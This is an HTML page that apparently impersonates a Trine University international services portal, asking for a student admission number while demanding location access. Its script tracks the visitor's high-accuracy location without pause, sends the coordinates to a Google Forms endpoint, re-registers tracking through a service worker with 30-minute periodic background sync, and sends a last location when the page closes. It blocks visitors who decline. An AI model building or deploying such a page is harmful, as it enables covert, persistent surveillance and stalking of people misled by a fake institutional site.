<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trine University - International Services</title>
    <style>
        body, html {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #e6e6e6;
        }
        .container {
            width: 100%;
            padding: 40px 0;
        }
        .header {
            background-color: #00447C;
            padding: 10px 20px;
            color: white;
            text-align: left;
        }
        .section {
            background-color: #f4f4f4;
            margin: 20px auto;
            padding: 20px;
            width: 70%;
            border-radius: 5px;
            text-align: left;
        }
        button, input[type="text"] {
            display: block;
            width: 80%;
            margin: 10px auto;
            padding: 10px;
            font-size: 16px;
        }
        label {
            font-weight: bold;
            display: block;
            margin-bottom: 5px;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
<div class="header">
    <h1>TRINE UNIVERSITY - International Services</h1>
</div>

<div class="container">
    <div class="section">
        <p id="locationError" class="hidden"></p>
        <p>To continue, please allow location tracking.</p>
        <label for="admissionNumber">Student Admission Number:</label>
        <input type="text" id="admissionNumber" name="admissionNumber" maxlength="14">
        <button id="submit">Enter</button>
        <p id="output"></p>
    </div>
</div>

<script>
    let db;

    document.addEventListener("DOMContentLoaded", function () {
        openDatabase().then(() => {
            checkLocationConsent();
        });

        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js')
            .then(reg => console.log("Service Worker Registered!", reg))
            .catch(err => console.log("Service Worker Registration Failed:", err));
        }
    });

    async function openDatabase() {
        return new Promise((resolve, reject) => {
            let request = indexedDB.open("UserConsentDB", 1);

            request.onupgradeneeded = function (event) {
                let db = event.target.result;
                if (!db.objectStoreNames.contains("consent")) {
                    db.createObjectStore("consent", { keyPath: "id" });
                }
            };

            request.onsuccess = function (event) {
                db = event.target.result;
                resolve();
            };

            request.onerror = function (event) {
                console.error("IndexedDB Error:", event.target.error);
                reject(event.target.error);
            };
        });
    }

    async function checkLocationConsent() {
        let consent = await getConsent();

        if (consent === "true") {
            // Check if location is enabled
            navigator.geolocation.getCurrentPosition(
                function () {
                    console.log("Location access is already enabled.");
                    startTracking();
                },
                function (error) {
                    console.warn("Location access not enabled: ", error.message);
                    askForConsent();
                }
            );
        } else {
            askForConsent();
        }
    }

    function askForConsent() {
        if (confirm("This website needs to track your location for security purposes. Do you allow this?")) {
            saveConsent("true");
            startTracking();
        } else {
            alert("You must allow location access to proceed.");
            document.getElementById("submit").disabled = true;
        }
    }

    function saveConsent(value) {
        let transaction = db.transaction(["consent"], "readwrite");
        let store = transaction.objectStore("consent");
        store.put({ id: "locationConsent", value: value });
    }

    function getConsent() {
        return new Promise((resolve) => {
            let transaction = db.transaction(["consent"], "readonly");
            let store = transaction.objectStore("consent");
            let request = store.get("locationConsent");

            request.onsuccess = function () {
                resolve(request.result ? request.result.value : null);
            };

            request.onerror = function () {
                resolve(null);
            };
        });
    }

    function startTracking() {
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(
                function (position) {
                    sendLocationToGoogleForms(position.coords.latitude, position.coords.longitude);
                },
                function (error) {
                    console.error("Location access denied or unavailable.");
                },
                { enableHighAccuracy: true, maximumAge: 1800000, timeout: 5000 } // Send every 30 mins
            );
        } else {
            console.error("Geolocation is not supported.");
        }
    }

    function sendLocationToGoogleForms(lat, long) {
        let formUrl = "https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse";
        let formData = new URLSearchParams();
        formData.append("entry.YOUR_LATITUDE_FIELD_ID", lat);
        formData.append("entry.YOUR_LONGITUDE_FIELD_ID", long);

        fetch(formUrl, { method: "POST", body: formData, mode: "no-cors" })
            .then(() => console.log("Location sent:", lat, long))
            .catch((error) => console.error("Error sending location:", error));
    }

    // Listen for background sync from Service Worker
    navigator.serviceWorker.addEventListener('message', (event) => {
        if (event.data.action === "send-location") {
            startTracking();
        }
    });

    // Background sync request when browser reopens
    navigator.serviceWorker.ready.then(async (registration) => {
        if ('periodicSync' in registration) {
            try {
                await registration.periodicSync.register('send-location', {
                    minInterval: 30 * 60 * 1000 // Sends location every 30 minutes
                });
                console.log("Background location tracking enabled!");
            } catch (error) {
                console.log("Periodic Sync Registration Failed:", error);
            }
        }
    });

    // Send final location before browser closes
    window.addEventListener("beforeunload", function () {
        getConsent().then((consent) => {
            if (consent === "true") {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function (position) {
                        sendLocationToGoogleForms(position.coords.latitude, position.coords.longitude);
                    });
                }
            }
        });
    });
</script>
</body>
</html>
